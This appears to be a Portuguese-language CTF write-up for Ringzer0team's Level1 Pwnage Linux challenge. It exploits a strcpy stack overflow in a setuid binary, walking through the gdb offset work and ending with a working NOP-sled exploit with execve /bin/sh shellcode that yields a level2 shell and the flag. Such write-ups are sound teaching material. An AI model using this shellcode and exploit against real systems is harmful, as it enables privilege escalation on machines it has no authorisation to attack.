---
layout: post
title: Level1 Pwnage Linux
categories:
  - Ringzer0team
published: true
---
<div class="message">Link do chall (requer login):https://ringzer0team.com/challenges/80</div>
Acredito que alguns requisitos serão necessários para aproveitar esse writeup ao 
máximo, como conhecer (nem que seja bem de leve) a estrutura de diretórios em um
linux, comandos básicos, permissões de usuário, um conhecimento leve de 
linguagem C, asm, gdb e debugging, manipulação de dados na memória e stack 
overflow também não iriam machucar. Caso ainda fique perdido em frente a um 
terminal e não conheça nada do linux, pode ficar dificil acompanhar, mas nada 
impede que se use o google para ir tirando as dúvidas que forem aparecendo. Sem 
falar que vou tentar explicar o máximo que poder mas sem me aprofundar muito 
para não perder o foco.

Agora deixe-me contar a história de como consegui a flag do Level1 da categoria
Pwnage Linux do Ringzer0team.

Depois de conectar ao servidor ssh (ssh ringzer0team.com -p 22222 -l level1), 
damos um "cat readme" e conhecemos as regras do ctf: os levels estão em /levels,
temos permissão de escrita em /tmp para, se for preciso, criar nossos exploits e
que os passwords para os próximos níveis estão em ~/.pass.

O objetivo desse primeiro nível é explorar o level1, que é um executável que 
está na pasta /levels, porque ele é executado como o usuário level2 (pesquise
sobre SETUID). Isso quer dizer que ele roda com os privilégios desse usuário no 
sistema e um dos privilégios que o user level2 tem é o de ler o arquivo .pass no
seu diretório home, que é nossa flag e nosso password para o level2.

A primeira coisa que fiz foi ir na pasta /levels e rodar o ./level1. Ao passarmos 
algum argumento, o programa roda mas não nos retorna nada. Temos um mistério. 
Que porra esse programa faz e como ele poderia ser explorado para os nossos fins?

Claro que poderíamos ler o arquivo level1.c. Nele tem o código do programa
level1. Mas somos hackudos demais, C é muito fácil. Vamos desmontar o level1 com
o objdump e ler código asm. Aí sim é coisa de hackudo.

Zoeiras a parte, preferi não ver o código em C do programa. Não que acredite que
isso tornaria o chall fácil demais, seria arrogante da minha parte. Minha
escolha foi baseada no fato de que normalmente não temos acesso ao código fonte
de programas que queremos explorar. Não ver o código fonte antes de resolver
iria colaborar para um aprendizado maior. Pelo menos foi no que acreditei.

Antes de passar o level1 para o objdump, resolvi usar o comando file level1 para
conhecer o programa um pouco melhor. O comando não retornou novidades, mas é bom
ter certeza. Pude ver que o arquivo é um ELF de 32 bits e não tá "strippado".

Então foi hora de passar para o objdump -d level1. O parametro -d procura e
exibe apenas seções em que se espera que tenham instruções, ao contrário do -D
que exibe todas as seções. Tente por aí e veja a diferença.

Procurei por <main> no resulado do objdump. Não sou um ninja do asm, apenas me
viro e qualquer coisa corro no google. Vou tentar explicar o que entendi e como.

As primeiras linhas são essas:
{% highlight js %}

 804841c:       55                      push   %ebp
 804841d:       89 e5                   mov    %esp,%ebp
 804841f:       83 e4 f0                and    $0xfffffff0,%esp
 8048422:       81 ec 10 04 00 00       sub    $0x410,%esp

{% endhighlight %}
Acredito que sejam referentes a formação do stack frame da função (relaxa que,
se não sabes o que é stack frame, o google te fala). Percebi também que a última
linha cria espaço nesse frame, 1040 bytes (subtraindo 410 em hex do ponteiro 
esp). Saber do tamanho desse espaço será útil mais para frente.

Tive mais dificuldade ao interpretar as linhas seguintes, que são essas:

{% endhighlight %}
 8048428:       8b 45 0c                mov    0xc(%ebp),%eax
 804842b:       83 c0 04                add    $0x4,%eax
 804842e:       8b 00                   mov    (%eax),%eax
 8048430:       89 44 24 04             mov    %eax,0x4(%esp)
 8048434:       8d 44 24 10             lea    0x10(%esp),%eax
 8048438:       89 04 24                mov    %eax,(%esp)
 804843b:       e8 c0 fe ff ff          call   8048300 <strcpy@plt>

{% endhighlight %}
Mas, por suposição, acreditei que elas fossem responsáveis por receber o
argumento e organizar as coisas para fazer uma chamada para strcpy. Essa função
recebe dois argumentos: uma string de origem e outra de destino. Ela
simplesmente copia a string de origem para o destino.

As três últimas linhas de instruções são essas:
{% highlight js %}

 8048440:       b8 00 00 00 00          mov    $0x0,%eax
 8048445:       c9                      leave
 8048446:       c3                      ret

{% endhighlight %}
O que, acredito, representam apenas o return(0) e morte da nossa função
(descubra no google sobre as instruções LEAVE e RET).

Ok, após essa análise, deu para descobrir porque o programa recebe um argumento
e não retorna nada. Aparentemente, ele recebe o argumento, passa a bola para 
strcpy, que copia o argumento para um destino (os dois, obrigatoriamente, teriam
que ser do tipo string) e então o programa é finalizado.

A função strcpy pode trazer problemas de segurança se não for usada com cuidado.
Nesse caso, podemos comprovar esse problema ao passar uma string muito grande
como argumento para o level1 usando o python para gerar um argumento com 2000
B's: ./level1 $(python -c 'print "B" * 2000). Isso irá retornar um erro de
segmentation fault, um clássico caso de buffer overflow onde strcpy recebe um
argumento que pode ser de qualquer tamanho possível e tenta copia-lo para uma
variável de tamanho fixo.

Agora como explorar essa falha para conseguir os privilégios do usuário level2?

Com o comando gdb -q level1, trago o programa para o debugger (o parametro -q só
serve para que o gdb não mostre sua versão e uns bla bla, tente sem e veja a
diferença). Então, com o comando run $(python -c 'print "B" * 2000'), faço com
que ele rode e receba como argumento o resultado da instrução em python que gera
2000 B's.
{% highlight js %}

Starting program: /levels/level1 $(python -c 'print "B" * 2000')

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()

{% endhighlight %}
0x42424242 é o valor atual de EIP, o registrador responsável por armazenar o 
endereço da próxima instrução a ser executada. E 42 é o B em hex. 4 dos 2000 B's
que passamos como argumento sobreescreveram o endereço de retorno da função que,
após ser finalizada, joga esse endereço para EIP. Isso significa que podemos ter
total controle sobre o programa level1. Se soubermos fazer EIP apontar para 
algum lugar com instruções "interessantes", executamos as mesmas com totais 
privilégios de level2.

Primeiro, para sobreescrever o endereço de retorno e mandar para EIP coisa mais 
útil que 4 B's, é necessário saber exatamente qual a posição dos B's que 
passaram por cima dele, afinal, como colocariamos o endereço que queremos em EIP
se não soubermos onde pôr esse endereço?

Há variadas formas de descobrir a posição. Muitos usariam o pattern_create do
metasploit ou coisa parecida. Mas no momento que resolvi o chall, não havia
metasploit disponível, então fiz "na mão" mesmo.

Lembra que no começo do writeup falei que acreditava que as primeiras linhas do
asm que o objdump nos mostrou era referente a formação do stackframe? E também
que acreditava que a última linha do trecho de código que destaquei criava
certo espaço nesse frame? A linha a qual me refiro é esta aqui:
{% highlight js %}

 8048422:       81 ec 10 04 00 00       sub    $0x410,%esp

{% endhighlight %}
Então, se o tamanho reservado seria de 1040 bytes (decimal de 410 em hex),
mandar até 1035 B's faria o programa finalizar normalmente, já que o endereço de
retorno ficaria salvo de ser corrompido. Você também pode fazer o teste:
{% highlight js %}

(gdb) run $(python -c 'print "B"*1035')
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /levels/level1 $(python -c 'print "B"*1035')
[Inferior 1 (process 27709) exited normally]

{% endhighlight %}
Ok, aqui pode surgir uma dúvida. Eu mesmo tive que recorrer ao google.
Se o endereço de retorno, o que vai cair em EIP, tem 4 bytes de tamanho, 4 B's,
porque mandar como argumento 1036 B's, traz este resultado:
{% highlight js %}

(gdb) run $(python -c 'print "B"*1036')
Starting program: /levels/level1 $(python -c 'print "B"*1036')

Program received signal SIGSEGV, Segmentation fault.
0xb7ea1e00 in __libc_start_main () from /lib/i386-linux-gnu/libc.so.6

?

{% endhighlight %}
Simples. Toda string tem um null terminator (\0) no seu fim.
É assim que strcpy e outras funções sabem que podem ignorar qualquer coisa que 
vier na memória após um 00. Quando passamos 1036 B's, estamos passando também um
00, que vai corromper nosso endereço de retorno e pode ser visto ali no fim de 
EIP (0xb7ea1e 00). Logo você também deve imaginar porque 1035 B's funciona sem 
problema.

Então, sem precisar do create_pattern e similares, apenas com a analíse do
programa, conseguimos descobrir exatamente onde pôr o endereço que desejamos.
Basta mandar 1036 B's + Endereço de retorno.
{% highlight js %}

(gdb) run  $(python -c 'print "B"*1036 + "R"*4')
Starting program: /levels/level1 $(python -c 'print "B"*1036 + "R"*4')

Program received signal SIGSEGV, Segmentation fault.
0x52525252 in ?? ()

{% endhighlight %}
52 é o hex de R *

Beleza. Sabemos como manipular EIP. E agora?

A ideia agora é executar algo que possa nos ajudar a alcançar nosso objetivo.
Pode se fazer de outras formas, mas eu decidi que iria querer uma shell com 
privilégios de usuário level2. Assim, poderia ler o arquivo .pass.

Para fazer isso, eu precisei de um shellcode que executasse /bin/sh e descobrir
para onde EIP deveria apontar para que executasse meu shellcode. Caso precise de
mais explicações sobre o que vem a ser um shellcode, pergunte ao google pois já
escreveram muita coisa sobre o assunto.

Como nesse level1 não há nenhuma proteção contra a exploração de stack overflow,
bastava que se descobrisse o endereço exato da memória onde nosso shellcode
estaria e fazer com que EIP apontasse para lá.

1036 bytes é mais do que suficiente para armazenar um shellcode. O que usei tem
apenas 21.

Agora precisamos encontrar em que endereço da memória esse monte de B's vai
parar.

Voltemos ao gdb e executamos run $(python -c 'print "B"*1036 + "R"*4').
Pronto, o programa dá erro. Em algum lugar da memória estão residindo esse monte
de B's.

No gdb há o comando x de "examinar". Ele serve para, claro, examinar a memória.
Resolvo usar x/100x $esp. Isso irá mostrar, a partir de ESP, que é o cara que
aponta para o topo do stack, o conteúdo de 100 endereços da memória em blocos
de quatro.
Como o resultado do comando x/100x $esp nos exibe muita coisa, menos os nossos
B's, decido aumentar o número usando x/200x $esp.

{% highlight js %}


0xbffff530:     0x00000000      0x00000000      0x03000000      0xdf96c26d
0xbffff540:     0x2100e899      0x2a303780      0x69cb98e8      0x00363836
0xbffff550:     0x656c2f00      0x736c6576      0x76656c2f      0x00316c65
0xbffff560:     0x42424242      0x42424242      0x42424242      0x42424242

</cpde>

E em meio a todos, encontro o primeiro B em 0xbffff560. Esse é o endereço do
inicio da string que passamos como argumento para level1.

Nesse momento resolvi fazer algo desnecessário mas que achei legal. Já que tinha
todo esse espaço e poder na memória, decidi criar um "nop sled" para acompanhar 
o shellcode.

A técnica do nop sled serve para quando não se sabe de forma exata o endereço em
que o shellcode se encontra.

Suponha que os endereços mudem cada vez que se executa level1. Isso exigiria que
o exploit fosse modificado em cada execução. Ainda assim funcionaria, mas não 
seria mais legal se ele funcionasse todas as vezes sem precisar ser alterado?
Para pôr essa técnica em prática, ao invés de milhares de B's, encheriamos a
string com \x90 que é o hex da instrução NOP. A instrução NOP (No Operation) é
válida, mas não faz nada. Se o processador encontrar um NOP ele apenas irá para
a próxima instrução. Com isso, passaríamos para EIP um endereço mais ou menos no
meio da nossa string do mal, então, caso a localização dela se alterasse um
pouco, EIP ainda poderia apontar para um dos NOPs da nossa string. E,
encontrando um desses NOPs, o programa não iria ser finalizado dando erro,
apenas iria sair "deslizando" pelos NOPs até o nosso shellcode, que será
posicionado no final da string.

Voltando ao gdb, usei o comando x/400x $esp para encontrar mais ou menos onde
estaria localizado a metade dos 1036 B's. Resolvi usar o endereço 0xbffff830.

Certo. Já sabemos quantos bytes são necessários para corromper o endereço de
retorno da função e agora sabemos para onde queremos que ele aponte. O último
passo é colocar o shellcode na memória e pôr nosso programa para executa-lo.

O shellcode que escolhi fica com a tarefa de executar /bin/sh:
{% highlight js %}

\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc2\xb0\x0b\xcd\x80

{% endhighlight %}
O google é seu amigo. Caso queira entender que porra é essa aí em cima,
não será difícil encontrar informações. Não seja um kiddie que só executa as
coisas que um tutorial manda :p

Então o código em python que explora level1 evoluiu disso aqui:
{% highlight js %}

python -c 'print "B"*1036 + "R"*4'

{% endhighlight %}
Para isso:
{% highlight js %}

python -c 'print "\x90"*1015 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc2\xb0\x0b\xcd\x80" + "\x30\xf8\xff\xbf"'

{% endhighlight %}
As mudanças foram: substitui os B's por \x90, que formarão o NOP sled. Subtrai
21 dos 1036, pois 21 é o tamanho em bytes do meu shellcode que segue logo depois
dos NOPs. E adicionei o endereço que quero que EIP aponte: 0xbffff830 que, por
causa da little endian (google it), precisa ser inserido com os bytes em ordem 
invertida (bf ff f8 30 vira 30 f8 ff bf).

Então é hora da verdade. Sai do gdb e executei a seguinte linha de comando:
{% highlight js %}

./level1 $(python -c 'print "\x90"*1015 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc2\xb0\x0b\xcd\x80" + "\x30\xf8\xff\xbf"')

{% endhighlight %}
Instantaneamente, vi meu prompt mudar de level1@rzt-bin01 para um módico $.
Foi só usar o comando whoami para ter certeza.
{% highlight js %}

$ whoami
level2
$ cat /home/level2/.pass
byBicmVubm9yZHMgZWggbyBtZWxob3I=

{% endhighlight %}
Pwned ;D
